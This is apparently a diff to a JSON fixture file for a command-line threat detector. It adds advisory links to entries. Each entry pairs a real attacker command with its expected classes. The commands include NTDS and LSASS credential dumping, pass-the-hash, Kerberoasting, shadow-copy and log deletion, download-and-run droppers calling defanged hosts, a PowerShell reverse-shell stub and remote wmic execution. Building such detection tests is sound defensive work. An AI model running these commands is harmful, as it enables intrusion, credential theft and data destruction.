@@ -3,6 +3,7 @@
     "id": "volt-typhoon-ntdsutil",
     "description": "Volt Typhoon NTDS credential extraction via ntdsutil IFM",
     "source": "CISA AA23-144A",
+    "source_url": "https://www.cisa.gov/sites/default/files/2023-05/aa23-144a_volt_typhoon_v2.pdf",
     "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Users\\Public\\tmp\" q q",
     "expect": {
       "classes": ["credential_theft"],
@@ -15,6 +16,7 @@
     "id": "volt-typhoon-netsh-portproxy",
     "description": "Volt Typhoon netsh portproxy C2 tunnel",
     "source": "CISA AA23-144A",
+    "source_url": "https://www.cisa.gov/sites/default/files/2023-05/aa23-144a_volt_typhoon_v2.pdf",
     "command": "netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=443 connectaddress=45.77.251.73",
     "expect": {
       "classes": ["c2_persistence"],
@@ -27,6 +29,7 @@
     "id": "conti-backup-destruction",
     "description": "Conti pre-encryption LOTL: VSS delete + backup wipe + bcdedit recovery disable",
     "source": "CISA AA21-265A",
+    "source_url": "https://www.cisa.gov/sites/default/files/publications/AA21-265A.pdf",
     "command": "cmd.exe /c vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wmic shadowcopy delete",
     "expect": {
       "classes": ["impact"],
@@ -39,6 +42,7 @@
     "id": "lockbit-vss-bcdedit",
     "description": "LockBit 3.0 pre-encryption LOTL: shadow copy deletion + bcdedit boot recovery disable",
     "source": "CISA AA23-165A",
+    "source_url": "https://www.cisa.gov/sites/default/files/2023-06/aa23-165a.pdf",
     "command": "cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled No & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & wbadmin delete catalog -quiet",
     "expect": {
       "classes": ["impact"],
@@ -51,6 +55,7 @@
     "id": "hafnium-certutil-stager",
     "description": "HAFNIUM ProxyLogon: IIS worker spawns cmd, certutil downloads next-stage implant",
     "source": "Microsoft Security Blog 2021-03-02",
+    "source_url": "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
     "command": "cmd.exe /c certutil.exe -urlcache -split -f hxxp://p.estonine[.]com/p",
     "expect": {
       "classes": ["dropper"],
@@ -63,6 +68,7 @@
     "id": "qakbot-regsvr32-dll",
     "description": "Qakbot initial execution: regsvr32 silently loads malicious DLL from Public directory",
     "source": "CISA AA23-242A",
+    "source_url": "https://www.cisa.gov/sites/default/files/2023/08/aa23-242a.pdf",
     "command": "regsvr32.exe /s C:\\Users\\Public\\svhost.dll",
     "expect": {
       "classes": ["loader"],
@@ -75,6 +81,7 @@
     "id": "fin7-mshta-dropper",
     "description": "FIN7 initial access: mshta javascript dropper downloads C2 implant via IEX",
     "source": "MITRE ATT&CK G0046",
+    "source_url": "https://attack.mitre.org/groups/G0046/",
     "command": "mshta.exe javascript:new ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('hxxp://185.62.188[.]88/m/m.ps1'))\",0,true)",
     "expect": {
       "classes": ["dropper", "loader", "defense_evasion"],
@@ -87,6 +94,7 @@
     "id": "apt41-procdump-lsass",
     "description": "APT41 credential access: procdump dumps LSASS memory for offline hash extraction",
     "source": "MITRE ATT&CK G0096",
+    "source_url": "https://attack.mitre.org/groups/G0096/",
     "command": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
     "expect": {
       "classes": ["credential_theft"],
@@ -99,6 +107,7 @@
     "id": "apt28-mimikatz-pth",
     "description": "APT28 pass-the-hash: sekurlsa::pth spawns cmd.exe with stolen NTLM hash",
     "source": "MITRE ATT&CK G0007",
+    "source_url": "https://attack.mitre.org/groups/G0007/",
     "command": "mimikatz.exe privilege::debug sekurlsa::pth /user:Admin /domain:CORP /ntlm:a29f7161e2b9f69ee75b37ce1a9ac5af /run:cmd.exe exit",
     "expect": {
       "classes": ["credential_theft"],
@@ -111,6 +120,7 @@
     "id": "apt29-rubeus-kerberoast",
     "description": "APT29 AD attack: Rubeus RC4-opsec Kerberoasting for offline hash cracking",
     "source": "MITRE ATT&CK G0016",
+    "source_url": "https://attack.mitre.org/groups/G0016/",
     "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:C:\\Windows\\Temp\\kerbhashes.txt",
     "expect": {
       "classes": ["credential_theft"],
@@ -123,6 +133,7 @@
     "id": "turla-wmi-fileless-persistence",
     "description": "Turla fileless WMI FilterToConsumerBinding persistence with encoded PowerShell beacon",
     "source": "MITRE ATT&CK G0010",
+    "source_url": "https://attack.mitre.org/groups/G0010/",
     "command": "powershell -ep bypass -enc JABGACAAPQAgAFMAZQB0AC0AVwBtAGkASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAgAC0AQwBsAGEAcwBzACAAXwBfAEUAdgBlAG4AdABGAGkAbAB0AGUAcgA=",
     "expect": {
       "classes": ["loader", "defense_evasion"],
@@ -135,6 +146,7 @@
     "id": "conti-event-log-wipe",
     "description": "Conti post-encryption anti-forensics: clears System, Security, Application logs",
     "source": "CISA AA21-265A",
+    "source_url": "https://www.cisa.gov/sites/default/files/publications/AA21-265A.pdf",
     "command": "cmd.exe /c wevtutil cl System & wevtutil cl Security & wevtutil cl Application & wevtutil cl Microsoft-Windows-PowerShell/Operational",
     "expect": {
       "classes": ["defense_evasion"],
@@ -147,6 +159,7 @@
     "id": "scattered-spider-tcp-shell",
     "description": "Scattered Spider PowerShell reverse shell via Net.Sockets.TcpClient — no binary on disk",
     "source": "CISA AA23-320A",
+    "source_url": "https://www.cisa.gov/sites/default/files/2023-11/aa23-320a_scattered-spider.pdf",
     "command": "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TcpClient('192.168.1.100',4444);$s=$c.GetStream()\"",
     "expect": {
       "classes": ["dropper", "defense_evasion"],
@@ -159,6 +172,7 @@
     "id": "apt41-7zip-staging",
     "description": "APT41 pre-exfiltration: 7z password-protected archive of Office/PDF documents",
     "source": "MITRE ATT&CK G0096",
+    "source_url": "https://attack.mitre.org/groups/G0096/",
     "command": "7z.exe a -tzip -mhe C:\\Windows\\Temp\\exfil.zip C:\\Users\\Public\\docs",
     "expect": {
       "classes": ["data_staging"],
@@ -170,7 +184,8 @@
   {
     "id": "lumma-stealer-clickfix-iex",
     "description": "Lumma Stealer ClickFix delivery: mshta downloads PS1 then IEX loads stealer via Net.WebClient",
-    "source": "ProofPoint ClickFix analysis 2024 https://www.proofpoint.com/us/blog/threat-insight/clipboard-hijacking",
+    "source": "ProofPoint ClickFix analysis 2024",
+    "source_url": "https://www.proofpoint.com/us/blog/threat-insight/clipboard-hijacking",
     "command": "mshta \"javascript:close();new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -w 1 -c \\\"$u=\\\"hxxps://cdn.lumma-cdn[.]xyz/build.ps1\\\";iex((New-Object Net.WebClient).DownloadString($u))\\\"',0,1);\"",
     "expect": {
       "classes": ["loader", "dropper", "defense_evasion"],
@@ -182,7 +197,8 @@
   {
     "id": "black-basta-vss-disable",
     "description": "Black Basta ransomware pre-encryption: vssadmin + bcdedit backup/recovery disable",
-    "source": "CISA AA24-131A Black Basta",
+    "source": "CISA AA24-131A",
+    "source_url": "https://www.cisa.gov/sites/default/files/2024-05/aa24-131a.pdf",
     "command": "cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No & wbadmin delete catalog -quiet & sdelete -p 3 -s -q C:\\Windows\\Temp\\*.dmp",
     "expect": {
       "classes": ["impact"],
@@ -195,6 +211,7 @@
     "id": "lazarus-wmic-process-create",
     "description": "Lazarus Group lateral movement via wmic process call create on remote host",
     "source": "MITRE ATT&CK G0032 ; CISA AA20-239A",
+    "source_url": "https://attack.mitre.org/groups/G0032/",
     "command": "wmic /node:\"10.10.1.25\" /user:\"CORP\\svc_deploy\" /password:\"P@ssw0rd123\" process call create \"powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('hxxp://c2.evil[.]xyz/a'))\"",
     "expect": {
       "classes": ["lateral_movement", "dropper", "defense_evasion"],
@@ -207,6 +224,7 @@
     "id": "fin8-process-injection-va-wpm",
     "description": "FIN8 process injection: VirtualAllocEx + WriteProcessMemory shellcode injection chain",
     "source": "MITRE ATT&CK G0061 ; Symantec FIN8 report 2021",
+    "source_url": "https://attack.mitre.org/groups/G0061/",
     "command": "powershell -c \"$h=OpenProcess(0x1F0FFF,0,$pid); $a=VirtualAllocEx($h,0,4096,0x3000,0x40); WriteProcessMemory($h,$a,$sc,4096,0); CreateRemoteThread($h,0,0,$a,0,0,0)\"",
     "expect": {
       "classes": ["loader"],
